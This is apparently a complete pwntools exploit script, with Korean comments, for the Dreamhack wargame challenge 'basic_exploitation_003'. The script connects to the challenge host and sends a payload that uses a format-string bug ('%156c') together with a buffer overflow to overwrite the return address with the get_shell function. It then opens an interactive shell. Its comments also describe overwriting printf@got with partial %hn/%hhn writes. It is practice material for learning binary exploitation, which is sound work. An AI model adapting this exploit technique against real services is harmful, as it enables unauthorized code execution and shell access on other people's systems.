from pwn import *

context.arch = "i386"
context.log_level = "debug"

# Local
# p = process('./basic_exploitation_003')

# Online
#"""
PORT = int(input("Port: "))
HOST = int(input("Host: "))
p = remote("host" + str(HOST) + ".dreamhack.games", PORT)
#"""

elf = ELF('./basic_exploitation_003')
get_shell = elf.symbols["get_shell"]	#0x08048669

# FSB와 BOF를 동시에 활용한 코드

payload = b"%" + b"%d"%(0x98 + 0x4) + b"c"
payload += p32(get_shell)
# read는 stack 영역에 문자열을 담고,
# sprintf는 heap 영역에 stack 영역에 문자열로 저장, 즉, "출력"하는 것이다.
# 156바이트를 Rtn Addr 직전까지 담고, Rtn Addr에 get_shell의 주소를 쓴다.

# 혹은 printf@got을 알아내어 그 주소를 FSB으로 바꾸어도 된다.
# printf@got를 알아내는 것은 call printf@plt에서 알 수 있는 주소를
# x/10i (주소) 등의 방법을 통해 검새갛여 got 주소를 알아낼 수 있다.
# 다만 이 방법의 경우, heap stack의 0x90만큼의 크기를 넘어가지 않도록
# hhn, hn 등을 통해 일부만 바꿔준다.

p.sendline(payload)

p.interactive()

